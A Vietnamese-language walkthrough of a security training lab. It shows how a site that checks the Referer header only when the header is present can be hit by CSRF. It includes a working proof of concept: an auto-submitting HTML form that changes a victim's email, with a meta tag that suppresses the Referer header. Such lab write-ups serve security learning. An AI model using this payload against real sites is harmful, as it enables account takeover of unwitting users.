# Validation of Referer depends on header being present

Một số web app xác nhận Referer header khi nó xuất hiện trong requests nhưng bỏ qua việc xác thực nếu header bị bypass.

Trong tình huống này, kẻ tấn công có thể tạo ra khai thác CSRF của họ theo cách khiến trình duyệt của người dùng nạn nhân bỏ *Referer header* trong request. Có nhiều cách khác nhau để đạt được điều này, nhưng dễ nhất là sử dụng thẻ meta trong trang HTML lưu trữ cuộc tấn công CSRF:

    <meta name="referrer" content="never">

# Lab: CSRF where Referer validation depends on header being present
![img](https://imgur.com/EbUriFI.png)

###  Web page
![img](https://imgur.com/pqyHARc.png)

### Solution

Nhắc lại, để 1 cuộc tấn công CSRF trở nên khả thi: 

- A relevant action: change a users email

- Cookie-based session handling: session cookie

- No unpredictable request parameters.

Log in bằng account được cấp: 

![img](https://imgur.com/5D2pNIx.png)

Thử change email: 

![img](https://imgur.com/jIWQihC.png)

Send request change email tới repeater: 

![img](https://imgur.com/1kd2B26.png)

--> Nhận thấy web page đáp ứng đủ 3 điều kiện để bị tấn công CSRF.

Thử thay đổi domain trong Referer header và xem response: 

![img](https://imgur.com/LldqRh4.png)

--> Nhận được thông báo Invalid referer header.

Thử xóa cả Referer Header và xem response: 

![img](https://imgur.com/PeGmVJt.png)

--> Email vẫn được thay đổi.

Chỉnh sửa payload có sẵn: 

    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
    <script>history.pushState('', '', '/')</script>
        <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="Test@Test.com" />
        <input type="submit" value="Submit request" />
        </form>
        <script>document.forms[0].submit();</script>
    </body>
    </html>

Thành: 

    <html>
    <head>
        <meta name="referrer" content="never">
    </head>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
    <script>history.pushState('', '', '/')</script>
        <form action="https://VULNERABLE-APPLICATION.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="Test@Test.com" />
        <input type="submit" value="Submit request" />
        </form>
        <script>document.forms[0].submit();</script>
    </body>
    </html>

Thêm thẻ meta sẽ hướng dẫn user agent không bao gồm Referer header và tất cả HTTP request có nguồn gốc từ domain gốc.

Go to exploit server và copy vào phần body: 

![img](https://imgur.com/ALMhYtB.png)

Store và View exploit: 

![img](https://imgur.com/OtfG8BY.png)

--> Email đã được thay đổi.

Thay đổi lại email trong payload và click Deliver exploit to victim.

Solved the lab!

![img](https://imgur.com/27FIsmz.png)

